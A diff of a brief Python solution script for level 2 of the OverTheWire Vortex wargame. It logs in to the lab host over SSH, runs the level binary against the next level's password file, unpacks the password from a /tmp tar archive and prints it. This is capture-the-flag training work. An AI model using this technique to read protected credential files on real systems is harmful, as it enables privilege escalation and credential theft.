@@ -4,7 +4,7 @@ level    = 2
 host     = 'vortex.labs.overthewire.org'
 user     = 'vortex%i' % level
 chal     = 'vortex%i' % level
-password  = '<removed>'
+password  = args['PASSWORD']
 passfile = '/etc/vortex_pass/vortex%i' % (level+1)
 binary   = '/vortex/%s' % chal
 shell    = ssh(host=host, user=user, password=password)
@@ -17,5 +17,6 @@ shell    = ssh(host=host, user=user, password=password)
 shell.run('%s %s' % (binary, passfile))
 
 # Extract it
-password  = '<removed>'
+password = shell.tar('xOf',"'/tmp/ownership.$$.tar'").strip()
 log.success('Password: %s' % password)
+sys.stderr.write(password)
